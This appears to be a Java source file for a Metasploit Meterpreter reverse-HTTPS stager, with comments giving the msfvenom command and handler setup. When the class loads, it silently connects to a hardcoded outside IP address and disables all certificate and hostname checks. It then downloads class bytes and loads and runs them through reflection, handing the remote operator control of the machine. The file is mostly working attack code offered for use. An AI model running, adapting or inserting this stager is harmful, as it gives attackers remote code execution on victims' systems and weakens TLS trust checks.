import javax.net.ssl.*;
import java.io.*;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;
import java.security.ProtectionDomain;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.StringTokenizer;

/**
 * https://github.com/Ramos-dev/R9000
 * msfvenom -p java/meterpreter/reverse_https LHOST=104.199.135.46 LPORT=65123 -f raw > https.jar
 * jar -xvf https.jar && tail metasploit.dat
 *
 * use exploits/multi/handler
 * set PAYLOAD java/meterpreter/reverse_https
 * set LHOST 0.0.0.0
 * set LPORT 65123
 * exploit
 *
 */
public class MSFPayload1 implements X509TrustManager, HostnameVerifier {

    static {
        try {
            InputStream inputStream2 = null;
            String payload = "https://104.199.135.46:65123/YOZLwXzGLZtQT1ReMklMnQJYLAIQM0luSnpPZerSZ-k5_pJpuFDyYrdy20gPvDPJuSVQJHDFzaTHD7EhBMZzX2aWLun34ToAYkkcUmjs2MvKrfTrUgbVKNyiD9uHNxQGg0cdhmXj0Ayf-w1N0MBbi91BzsirY9MaX6RZM6b6S7u0GZin9BrEYQnDqqGrpNke3Feitk_PSUT4hD2ntqAAj9z8MX3VmzFiVUe";
            if ( payload.startsWith( "https" ) ) {
                URLConnection obj = new URL( payload ).openConnection();
                useFor( obj );
                inputStream2 = ( obj ).getInputStream();
            }else {
                inputStream2 = new URL( payload ).openStream();
            }
            OutputStream outputStream  = new ByteArrayOutputStream();

            Object localObject6 = new StringTokenizer( "Payload -- " + "", " " );
            String[] arrayOfString = new String[( (StringTokenizer) localObject6 ).countTokens()];
            for ( int m = 0; m < arrayOfString.length; m++ ) {
                arrayOfString[m] = ( (StringTokenizer) localObject6 ).nextToken();
            }
            new MSFPayload1().bootstrap( inputStream2, outputStream, null, arrayOfString );
        }
        catch (Exception e) {
        }
    }

    public final void bootstrap( InputStream inputStream, OutputStream outputStream, String string, String[] arrstring)throws Exception {
        try {
            Class<?> class_ = null;
            DataInputStream dataInputStream = new DataInputStream( inputStream );

            if ( string == null ) {
                int n = dataInputStream.readInt();
                do {
                    byte[] arrby = new byte[n];
                    dataInputStream.readFully(arrby);

                    ClassLoader loader = getClass().getClassLoader();
                    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",String.class, byte[].class, int.class, int.class, ProtectionDomain.class);
                    defineClass.setAccessible(true);
                    class_ = (Class< ? >) defineClass.invoke(loader, null, arrby, 0, n, null);

                    Method resolveClass = ClassLoader.class.getDeclaredMethod("resolveClass",Class.class);
                    resolveClass.setAccessible(true);
                    resolveClass.invoke(loader, class_);

                }
                while (( n = dataInputStream.readInt()) > 0);
            }

            Object obj = class_.newInstance();
            class_.getMethod( "start", DataInputStream.class, OutputStream.class, String[].class ).invoke( obj, dataInputStream,  outputStream, arrstring );
        }
        catch ( Throwable throwable ){
            throwable.printStackTrace( new PrintStream( outputStream ) );
        }
    }

    @Override
    public boolean verify(String s, SSLSession sslSession){
        return true;
    }

    @Override
    public void checkClientTrusted( X509Certificate[] x509Certificates, String s ) throws CertificateException {}

    @Override
    public void checkServerTrusted( X509Certificate[] x509Certificates, String s ) throws CertificateException {}

    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }

    public static void useFor( URLConnection paramURLConnection ) throws Exception {
        if ( ( paramURLConnection instanceof HttpsURLConnection )){
            HttpsURLConnection localHttpsURLConnection = (HttpsURLConnection) paramURLConnection;
            MSFPayload1 localPayloadTrustManager = new MSFPayload1();
            SSLContext localSSLContext = SSLContext.getInstance( "SSL" );
            localSSLContext.init( null, new TrustManager[] { localPayloadTrustManager }, new SecureRandom() );
            localHttpsURLConnection.setSSLSocketFactory( localSSLContext.getSocketFactory() );
            localHttpsURLConnection.setHostnameVerifier( localPayloadTrustManager );
        }
    }



    public static void main(String[] args) throws Throwable {
        MSFPayload1 t = new MSFPayload1();
    }
}